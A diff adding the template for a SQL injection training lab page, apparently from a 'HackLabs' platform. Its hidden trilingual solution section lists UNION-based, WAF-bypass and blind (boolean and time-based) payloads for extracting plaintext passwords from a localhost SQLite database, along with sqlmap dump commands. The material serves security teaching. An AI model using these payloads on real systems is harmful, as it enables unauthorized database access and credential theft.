@@ -1,0 +1,192 @@
+{% extends "base.html" %}
+{% block title %}SQL Injection – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="sqli_obj_desc">El buscador concatena tu entrada en la consulta SQL. Inyecta para listar el producto oculto de categoría secret, cuya descripción contiene la flag.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>HL{···}</code> <span data-i18n="obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <form method="GET" action="/sqli/search" class="flex gap-3 items-end">
+      <div class="flex-1">
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_search_products">Buscar productos</label>
+        <input type="text" name="q" value="{{ query | e }}" placeholder="Search..." class="hl-input font-mono" data-i18n-placeholder="ph_search_products" />
+      </div>
+      <button type="submit" class="btn-primary flex-shrink-0" data-i18n="btn_search">Buscar</button>
+    </form>
+  </div>
+
+  {% if executed_query %}
+  <div class="hl-code mb-3 text-xs text-gray-500 dark:text-gray-500">
+    <span class="text-gray-400" data-i18n="sqli_query">Consulta:</span> <span class="text-yellow-500">{{ executed_query }}</span>
+  </div>
+  {% endif %}
+  {% if sql_error %}
+  <div class="alert-error mb-4 font-mono text-xs">{{ sql_error }}</div>
+  {% endif %}
+  {% if results %}
+  <div class="hl-card mb-4 overflow-x-auto">
+    <div class="text-xs text-gray-400 mb-3">{{ results | length }} result(s)</div>
+    <table class="hl-table">
+      <thead><tr>{% for col in results[0].keys() %}<th>{{ col }}</th>{% endfor %}</tr></thead>
+      <tbody>
+        {% for row in results %}
+        <tr>{% for val in row %}<td>{{ val }}</td>{% endfor %}</tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+  {% elif query and not sql_error %}
+  <div class="hl-card mb-4 text-sm text-gray-400" data-i18n="sqli_no_results">Sin resultados para "{{ query | e }}"</div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Error-based (sin WAF)</h3>
+    <ol>
+      <li>Verifica la inyección — devuelve todos los productos:
+        <pre>' OR '1'='1</pre></li>
+      <li>Extrae la estructura de la base de datos:
+        <pre>' UNION SELECT 0,name,sql,3,4 FROM sqlite_master-- -</pre></li>
+      <li>Extrae datos sensibles de la tabla users:
+          <pre>' UNION SELECT 0,username,password_plain,3,4 FROM users-- -</pre></li>
+        <li>Obtén la versión de la base de datos:
+          <pre>' UNION SELECT 0,sqlite_version(),3,4,5 FROM products-- -</pre></li>
+        <li>Obtén el nombre de la base de datos:
+          <pre>' UNION SELECT 0,name,2,3,4 FROM pragma_database_list-- -</pre></li>
+        <li>Enumera todas las tablas del schema:
+          <pre>' UNION SELECT 0,name,2,3,4 FROM sqlite_master WHERE type='table'-- -</pre></li>
+        <li>Enumera las columnas de la tabla users:
+          <pre>' UNION SELECT 0,name,type,3,4 FROM pragma_table_info('users')-- -</pre></li>
+      <li>O automatiza con sqlmap:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Medium — Bypass de blacklist</h3>
+    <ol>
+      <li>El WAF bloquea palabras clave en minúsculas. Bypassea con mayúsculas mixtas:
+          <pre>' UnIoN SeLeCt 0,username,password_plain,3,4 FROM users-- -</pre></li>
+      <li>O usa sqlmap con tamper de randomcase:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --tamper=randomcase --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Hard — Blind (boolean-based + time-based)</h3>
+    <ol>
+      <li>No se muestran errores. Usa boolean-based blind para extraer carácter a carácter:
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN 'TRUE' ELSE 'FALSE' END), 2, 3, 4 FROM products-- -</pre>
+        Si ves "TRUE" en la tabla, el carácter es correcto. Cambia el carácter hasta que la consulta devuelva "TRUE".</li>
+      <li>Time-based blind con SQLite (randomblob genera delay):
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products-- -</pre>
+        <div class="text-xs text-gray-400 mt-1">Si la condición es verdadera, la página tarda mucho en cargar; si es falsa, responde rápido. El valor mostrado será siempre "x". <b>Observa el tiempo de respuesta, no el contenido.</b></div>
+      </li>
+      <li>Automatiza con sqlmap especificando las técnicas blind:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=BT --level=5 --risk=3 --batch --dump</pre></li>
+      <li>Automatiza la extracción time-based con el script incluido:
+        <pre>python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000</pre>
+        <div class="text-xs text-gray-400 mt-1">El script detecta automáticamente la IP/URL objetivo y extrae la contraseña usando retardos de tiempo.</div>
+      </li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Error-based (no WAF)</h3>
+    <ol>
+      <li>Verify injection — returns all products:
+        <pre>' OR '1'='1</pre></li>
+      <li>Extract the database structure:
+        <pre>' UNION SELECT 0,name,sql,3,4 FROM sqlite_master-- -</pre></li>
+      <li>Extract sensitive data from the users table:
+          <pre>' UNION SELECT 0,username,password_plain,3,4 FROM users-- -</pre></li>
+        <li>Get the database version:
+          <pre>' UNION SELECT 0,sqlite_version(),3,4,5 FROM products-- -</pre></li>
+        <li>Get the database name:
+          <pre>' UNION SELECT 0,name,2,3,4 FROM pragma_database_list-- -</pre></li>
+        <li>Enumerate all tables in the schema:
+          <pre>' UNION SELECT 0,name,2,3,4 FROM sqlite_master WHERE type='table'-- -</pre></li>
+        <li>Enumerate columns of the users table:
+          <pre>' UNION SELECT 0,name,type,3,4 FROM pragma_table_info('users')-- -</pre></li>
+      <li>Or automate with sqlmap:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Medium — Blacklist bypass</h3>
+    <ol>
+      <li>The WAF blocks lowercase keywords. Bypass with mixed case:
+        <pre>' UnIoN SeLeCt 0,username,password_plain,3,4 FROM users-- -</pre></li>
+      <li>Or use inline comments to break keywords:
+        <pre>' /*!UNION*/ /*!SELECT*/ 0,username,password_plain,3,4 FROM users--</pre></li>
+      <li>Or use sqlmap with the randomcase tamper:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --tamper=randomcase --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Hard — Blind (boolean-based + time-based)</h3>
+    <ol>
+      <li>No errors are shown. Use boolean-based blind to extract data character by character:
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN 'TRUE' ELSE 'FALSE' END), 2, 3, 4 FROM products-- -</pre>
+        If you see "TRUE" in the table, the character is correct. Change the character until the query returns "TRUE".</li>
+      <li>Time-based blind with SQLite (randomblob generates delay):
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products-- -</pre>
+        <div class="text-xs text-gray-400 mt-1">If the condition is true, the page will take a long time to load; if false, it will respond quickly. The value shown will always be "x". <b>Watch the response time, not the content.</b></div>
+      </li>
+      <li>Automate with sqlmap specifying blind techniques:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=BT --level=5 --risk=3 --batch --dump</pre></li>
+      <li>Automate time-based extraction with the included script:
+        <pre>python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000</pre>
+        <div class="text-xs text-gray-400 mt-1">The script auto-completes the target IP/URL and extracts the password using time delays.</div>
+      </li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Baseado em erro (sem WAF)</h3>
+    <ol>
+      <li>Verifique a injeção — retorna todos os produtos:
+        <pre>' OR '1'='1</pre></li>
+      <li>Extraia a estrutura do banco de dados:
+        <pre>' UNION SELECT 0,name,sql,3,4 FROM sqlite_master-- -</pre></li>
+      <li>Extraia dados confidenciais da tabela users:
+        <pre>' UNION SELECT 0,username,password_plain,3,4 FROM users-- -</pre></li>
+      <li>Obtenha a versão do banco de dados:
+        <pre>' UNION SELECT 0,sqlite_version(),3,4,5 FROM products-- -</pre></li>
+      <li>Obtenha o nome do banco de dados:
+        <pre>' UNION SELECT 0,name,2,3,4 FROM pragma_database_list-- -</pre></li>
+      <li>Enumere todas as tabelas do schema:
+        <pre>' UNION SELECT 0,name,2,3,4 FROM sqlite_master WHERE type='table'-- -</pre></li>
+      <li>Enumere as colunas da tabela users:
+        <pre>' UNION SELECT 0,name,type,3,4 FROM pragma_table_info('users')-- -</pre></li>
+      <li>Ou automatize com sqlmap:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Médio — Bypass de blacklist</h3>
+    <ol>
+      <li>O WAF bloqueia palavras-chave em minúsculas. Faça o bypass alternando maiúsculas e minúsculas:
+        <pre>' UnIoN SeLeCt 0,username,password_plain,3,4 FROM users-- -</pre></li>
+      <li>Ou use comentários inline para quebrar as palavras-chave:
+        <pre>' /*!UNION*/ /*!SELECT*/ 0,username,password_plain,3,4 FROM users--</pre></li>
+      <li>Ou use o sqlmap com o tamper randomcase:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --tamper=randomcase --level=5 --risk=3 --batch --dump</pre></li>
+    </ol>
+    <h3>Difícil — Blind (baseado em booleano + baseado em tempo)</h3>
+    <ol>
+      <li>Nenhum erro é exibido. Use blind baseado em booleano para extrair caractere por caractere:
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN 'TRUE' ELSE 'FALSE' END), 2, 3, 4 FROM products-- -</pre>
+        Se vir "TRUE" na tabela, o caractere está correto. Altere o caractere até a consulta retornar "TRUE".</li>
+      <li>Blind baseado em tempo com SQLite (randomblob gera atraso):
+        <pre>' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products-- -</pre>
+        <div class="text-xs text-gray-400 mt-1">Se a condição for verdadeira, a página demorará para carregar; se for falsa, responderá rapidamente. O valor exibido será sempre "x". <b>Observe o tempo de resposta, não o conteúdo.</b></div>
+      </li>
+      <li>Automatize com o sqlmap especificando técnicas de blind:
+        <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=BT --level=5 --risk=3 --batch --dump</pre></li>
+      <li>Automatize a extração baseada em tempo com o script incluído:
+        <pre>python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000</pre>
+        <div class="text-xs text-gray-400 mt-1">O script detecta automaticamente o IP/URL alvo e extrai a senha usando atrasos de tempo.</div>
+      </li>
+    </ol>
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span></div>
+  </div>
+</div>
+{% endblock %}
